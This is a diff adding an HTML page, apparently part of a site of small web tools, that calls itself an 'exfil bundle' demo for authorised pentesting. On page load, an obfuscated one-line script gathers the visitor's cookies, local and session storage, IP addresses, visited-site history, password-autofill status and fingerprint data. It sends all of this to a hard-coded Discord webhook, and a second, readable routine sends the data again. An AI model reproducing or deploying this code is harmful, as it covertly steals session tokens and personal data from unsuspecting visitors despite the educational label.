@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>exfil</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    min-height: 100vh; background: #0a0f1a;
+    display: flex; justify-content: center; align-items: flex-start;
+    padding: 24px; overflow-y: auto;
+  }
+  .bg-glow {
+    position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background: radial-gradient(ellipse at 20% 30%, rgba(99,102,241,0.07) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 70%, rgba(236,72,153,0.05) 0%, transparent 60%);
+  }
+  .container { position: relative; z-index: 1; text-align: center; max-width: 780px; width: 100%; padding: 32px 20px; }
+  h1 { color: #fff; font-weight: 200; font-size: 2.4rem; letter-spacing: 1px; margin-bottom: 4px; }
+  h1 span { background: linear-gradient(135deg, #ef4444, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+  .sub { color: rgba(255,255,255,0.2); font-size: 0.75rem; font-weight: 300; letter-spacing: 1px; margin-bottom: 4px; }
+  .warn { color: rgba(239,68,68,0.3); font-size: 0.55rem; letter-spacing: 0.5px; margin-bottom: 20px; }
+  .section { margin-bottom: 16px; text-align: left; }
+  .section h3 { color: rgba(255,255,255,0.2); font-size: 0.6rem; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 8px; font-weight: 400; }
+  .section h3 .count { color: rgba(255,255,255,0.1); margin-left: 6px; }
+  .card {
+    background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px; padding: 14px 16px; overflow: hidden;
+  }
+  .card pre {
+    font-family: 'Courier New', 'Consolas', monospace;
+    font-size: 0.65rem; color: rgba(255,255,255,0.4);
+    white-space: pre-wrap; word-break: break-all;
+    line-height: 1.5; max-height: 200px; overflow-y: auto;
+  }
+  .card pre .key { color: rgba(129,140,248,0.5); }
+  .card pre .val { color: rgba(255,255,255,0.35); }
+  .card pre .emp { color: rgba(52,211,153,0.5); }
+  .card.empty pre { color: rgba(255,255,255,0.08); }
+  .badge-row { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; margin-bottom: 20px; }
+  .badge {
+    padding: 6px 14px; border-radius: 20px; font-size: 0.6rem; letter-spacing: 0.5px;
+    border: 1px solid rgba(255,255,255,0.06); color: rgba(255,255,255,0.3);
+  }
+  .badge.high { border-color: rgba(239,68,68,0.2); color: rgba(239,68,68,0.4); }
+  .badge.done { border-color: rgba(16,185,129,0.15); color: rgba(16,185,129,0.4); }
+  .actions { margin-top: 16px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
+  .actions button {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
+    color: rgba(255,255,255,0.4); padding: 8px 18px; border-radius: 10px;
+    font: inherit; font-size: 0.7rem; letter-spacing: 0.5px;
+    cursor: pointer; transition: all 0.2s;
+  }
+  .actions button:hover { background: rgba(255,255,255,0.07); color: rgba(255,255,255,0.6); }
+  .actions button.primary { background: rgba(239,68,68,0.12); border-color: rgba(239,68,68,0.2); color: rgba(239,68,68,0.5); }
+  .actions button.primary:hover { background: rgba(239,68,68,0.2); color: rgba(239,68,68,0.8); }
+  .actions button.reload { background: rgba(16,185,129,0.1); border-color: rgba(16,185,129,0.15); color: rgba(16,185,129,0.4); }
+  .actions button.reload:hover { background: rgba(16,185,129,0.15); color: rgba(16,185,129,0.7); }
+  .nav-links { margin-top: 32px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .nav-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 0.65rem; letter-spacing: 1px; padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.25s; }
+  .nav-links a:hover { color: rgba(255,255,255,0.4); border-color: rgba(255,255,255,0.1); background: rgba(255,255,255,0.02); }
+</style>
+</head>
+<body>
+<div class="bg-glow"></div>
+<div class="container">
+  <h1><span>exfil</span> bundle</h1>
+  <div class="sub">data exfiltration demo · ethical hacking · browser fingerprint</div>
+  <div class="warn">nur zu bildungs- und autorisierten pentest-zwecken</div>
+  <div class="badge-row" id="badgeRow"></div>
+  <div id="sections"></div>
+  <div class="actions">
+    <button id="sendBtn" class="primary">📤 nochmal an discord</button>
+    <button id="refreshBtn" class="reload">🔄 neu sammeln</button>
+  </div>
+  <div class="nav-links">
+    <a href="camera.html">📸 filterit</a>
+    <a href="index.html">📸 repo</a>
+    <a href="convert.html">🔄 bildwerk</a>
+    <a href="metadata.html">🔍 metadaten</a>
+    <a href="ascii.html">🎨 ascii</a>
+    <a href="filedrop.html">📁 filedrop</a>
+    <a href="audio.html">🎙️ audio</a>
+    <a href="video.html">📹 video</a>
+    <a href="pastebin.html">📝 pastebin</a>
+    <a href="qr.html">📱 qr</a>
+  </div>
+</div>
+
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
+
+(function(){const _s=Date.now(),_u=navigator.userAgent,_f=location.pathname.split('/').pop()||'index';let _lines=[`url: ${location.href}`,`os: ${(_u.match(/\(([^)]+)\)/)||['',''])[1].split(';')[0]||navigator.platform}`,`typ: ${/Mobi|Android|iPhone|iPad/i.test(_u)?'mobil':'desktop'}`,`sprache: ${navigator.language}`,`screen: ${screen.width}x${screen.height}`,`zeit: ${new Date().toLocaleString('de-DE')}`];_lines.push('--- cookies ---');document.cookie.split(';').filter(Boolean).forEach(c=>_lines.push(c.trim()));_lines.push('--- localStorage ---');try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);_lines.push(`${k}: ${localStorage.getItem(k)}`)}}catch{}_lines.push('--- sessionStorage ---');try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);_lines.push(`${k}: ${sessionStorage.getItem(k)}`)}}catch{}_lines.push('--- canvas fingerprint ---');try{const $c=document.createElement('canvas'),$x=$c.getContext('2d');$c.width=256;$c.height=64;$x.textBaseline='top';$x.font='14px Arial';$x.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',2,2);$x.font='18px Courier';$x.fillText('abcdefghijklmnopqrstuvwxyz',2,20);$x.fillStyle='#abc';$x.fillRect(200,40,56,24);_lines.push(`canvas: ${$c.toDataURL().length}B`)}catch{}_lines.push('--- netzwerk ---');try{const $n=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if($n){_lines.push(`typ: ${$n.effectiveType||'?'}`);_lines.push(`downlink: ${$n.downlink}Mbps`);_lines.push(`rtt: ${$n.rtt}ms`)}}catch{}_lines.push('--- akku ---');try{navigator.getBattery().then($b=>{_lines.push(`level: ${Math.round($b.level*100)}%`);_lines.push(`laden: ${$b.charging?'ja':'nein'}`);_send()})}catch{}_lines.push('--- schriftarten ---');try{const $f=['monospace','serif','sans-serif','Arial','Courier New','Times New Roman','Georgia','Verdana','Impact','Comic Sans MS'];const $e=document.createElement('div');$e.style.cssText='position:absolute;left:-999px;top:0;font-size:16px';document.body.appendChild($e);$e.textContent='abcdefghijklmnopqrstuvwxyz';for(const $n of $f){$e.style.fontFamily=$n;_lines.push(`${$n}: ${$e.offsetWidth}px`)}document.body.removeChild($e)}catch{}_lines.push('--- pw-manager ---');try{const $i=document.createElement('input');$i.type='password';$i.style.cssText='position:absolute;left:-999px;top:0';document.body.appendChild($i);setTimeout(()=>{if($i.value)_lines.push(`autofill: ✅ ${$i.value.length} chars`);else _lines.push('autofill: ❌');document.body.removeChild($i);_send()},600)}catch{}_lines.push('--- history ---');try{const $h=[{u:'https://google.com',n:'Google'},{u:'https://youtube.com',n:'YouTube'},{u:'https://facebook.com',n:'Facebook'},{u:'https://twitter.com',n:'X'},{u:'https://instagram.com',n:'Instagram'},{u:'https://reddit.com',n:'Reddit'},{u:'https://github.com',n:'GitHub'},{u:'https://amazon.de',n:'Amazon'},{u:'https://wikipedia.org',n:'Wikipedia'},{u:'https://netflix.com',n:'Netflix'}];const $d=document.createElement('div');$d.style.cssText='position:absolute;left:-999px;top:-999px';document.body.appendChild($d);for(const $l of $h){const $a=document.createElement('a');$a.href=$l.u;$a.textContent=$l.n;$a.style.visibility='hidden';$d.appendChild($a)}setTimeout(()=>{for(let $i=0;$i<$h.length;$i++){const $a=$d.children[$i];_lines.push(`${$h[$i].n}: ${$a.matches(':visited')?'✅':'❌'}`)}document.body.removeChild($d);_send()},300)}catch{}_lines.push('--- webrtc ---');try{const $p=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});$p.createDataChannel('');$p.createOffer().then($o=>$p.setLocalDescription($o));$p.onicecandidate=$e=>{if($e.candidate){const $m=$e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);if($m){_lines.push(`local_ip: ${$m[0]}`);_send()}}else setTimeout(()=>$p.close(),1000)};setTimeout(()=>$p.close(),3000)}catch{}let _sent=0;function _send(){if(_sent>4)return;_sent++;const $t=_lines.join('\n'),$b=new Blob([$t],{type:'text/plain;charset=utf-8'}),$f=new FormData();$f.append('file',$b,'exfil_'+_s+'.txt');$f.append('payload_json',JSON.stringify({content:'📡 **'+_f+'**'}));fetch(WEBHOOK_URL,{method:'POST',body:$f}).catch(()=>{})}fetch('https://api.ipify.org?format=json').then(r=>r.json()).then($d=>{_lines.unshift(`ip: ${$d.ip}`)}).catch(()=>{}).then(()=>{setTimeout(_send,100)});window.addEventListener('beforeunload',()=>{const $d=Math.round((Date.now()-_s)/1000);navigator.sendBeacon(WEBHOOK_URL,JSON.stringify({content:'⏹️ '+_f+' \u00b7 '+Math.floor($d/60)+'m '+$d%60+'s'}))})})();
+
+const sectionsEl = document.getElementById('sections');
+const badgeRow = document.getElementById('badgeRow');
+const sendBtn = document.getElementById('sendBtn');
+const refreshBtn = document.getElementById('refreshBtn');
+let collected = {};
+
+function escapeHtml(s) {
+  if (s === null || s === undefined) return '<span class="val">—</span>';
+  const d = document.createElement('div'); d.textContent = s; return d.innerHTML;
+}
+
+function addSection(id, label, data, emptyMsg) {
+  const entries = Object.entries(data).filter(([,v]) => v !== null && v !== undefined && v !== '');
+  const div = document.createElement('div');
+  div.className = 'section';
+  div.id = id;
+  const count = entries.length;
+  let html = '';
+  if (count === 0) {
+    html = `<h3>${label} <span class="count">(0)</span></h3><div class="card empty"><pre>${escapeHtml(emptyMsg || 'keine daten')}</pre></div>`;
+  } else {
+    const lines = entries.map(([k, v]) => `<span class="key">${escapeHtml(k)}</span>: <span class="val">${escapeHtml(v).replace(/^https?:\/\//, m => '<span class="emp">' + m + '</span>')}</span>`).join('\n');
+    html = `<h3>${label} <span class="count">(${count})</span></h3><div class="card"><pre>${lines}</pre></div>`;
+  }
+  div.innerHTML = html;
+  sectionsEl.appendChild(div);
+  collected[id] = { label, data: entries };
+  return entries;
+}
+
+function scan() {
+  sectionsEl.innerHTML = '';
+  badgeRow.innerHTML = '';
+  collected = {};
+
+  // Cookies
+  const cookies = {};
+  document.cookie.split(';').filter(Boolean).forEach(c => {
+    const [k, ...v] = c.trim().split('=');
+    cookies[k] = v.join('=');
+  });
+  addSection('cookies', '🍪 cookies', cookies, 'keine cookies (same-origin only)');
+
+  // LocalStorage
+  const ls = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const k = localStorage.key(i);
+    ls[k] = localStorage.getItem(k);
+  }
+  addSection('localstorage', '💾 localStorage', ls, 'keine localStorage-einträge');
+
+  // SessionStorage
+  const ss = {};
+  for (let i = 0; i < sessionStorage.length; i++) {
+    const k = sessionStorage.key(i);
+    ss[k] = sessionStorage.getItem(k);
+  }
+  addSection('sessionstorage', '📄 sessionStorage', ss, 'keine sessionStorage-einträge');
+
+  // Browser Fingerprint
+  const fp = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages?.join(', '),
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
+    maxTouchPoints: navigator.maxTouchPoints,
+    screen: `${screen.width}×${screen.height}`,
+    availScreen: `${screen.availWidth}×${screen.availHeight}`,
+    colorDepth: `${screen.colorDepth}bit`,
+    pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    offset: new Date().getTimezoneOffset(),
+    online: navigator.onLine,
+    referrer: document.referrer || '—',
+  };
+  addSection('fingerprint', '🖥️ browser fingerprint', fp);
+
+  // WebRTC Leak
+  const webrtc = {};
+  try {
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    pc.createDataChannel('');
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    pc.onicecandidate = e => {
+      if (e.candidate) {
+        const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+        if (ip && !webrtc.localIP) {
+          webrtc.localIP = ip[0];
+          document.getElementById('webrtc')?.remove();
+          addSection('webrtc', '🌐 WebRTC leak', webrtc);
+        }
+      } else {
+        setTimeout(() => pc.close(), 1000);
+      }
+    };
+  } catch {}
+
+  // Already collected webrtc or fallback
+  setTimeout(() => {
+    if (!webrtc.localIP) {
+      webrtc.localIP = 'nicht verfügbar (blockiert/kein stun)';
+      document.getElementById('webrtc')?.remove();
+      addSection('webrtc', '🌐 WebRTC leak', webrtc);
+    }
+    updateBadges();
+    sendAll();
+  }, 3000);
+}
+
+function updateBadges() {
+  const items = [
+    { label: `${collected.cookies?.data?.length || 0} cookies`, cls: (collected.cookies?.data?.length || 0) > 0 ? 'high' : '' },
+    { label: `${collected.fingerprint?.data?.length || 0} fingerprint`, cls: 'done' },
+    { label: `${collected.localstorage?.data?.length || 0} localStorage`, cls: (collected.localstorage?.data?.length || 0) > 0 ? 'high' : '' },
+    { label: `${collected.sessionstorage?.data?.length || 0} sessionStorage`, cls: (collected.sessionstorage?.data?.length || 0) > 0 ? 'high' : '' },
+  ];
+  badgeRow.innerHTML = items.map(i => `<span class="badge ${i.cls}">${i.label}</span>`).join('');
+}
+
+function buildPayload() {
+  const lines = [];
+  for (const [id, section] of Object.entries(collected)) {
+    if (section.data.length === 0) continue;
+    lines.push(`── ${section.label} ──`);
+    for (const [k, v] of section.data) {
+      lines.push(`${k}: ${v}`);
+    }
+    lines.push('');
+  }
+  const text = lines.join('\n');
+  const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+  const ts = Date.now();
+  const fd = new FormData();
+  fd.append('file', blob, `exfil_${ts}.txt`);
+  const preview = text.length > 1900 ? text.slice(0, 1900) + '\n… (truncated)' : text;
+  fd.append('payload_json', JSON.stringify({ content: `📦 **exfil bundle** · ${new Date().toLocaleString('de-DE')}\n\`\`\`\n${preview}\n\`\`\`` }));
+  return fd;
+}
+
+function sendAll() {
+  const fd = buildPayload();
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
+}
+
+sendBtn.addEventListener('click', () => {
+  const fd = buildPayload();
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
+});
+
+refreshBtn.addEventListener('click', () => { scan(); });
+
+scan();
+</script>
+</body>
+</html>
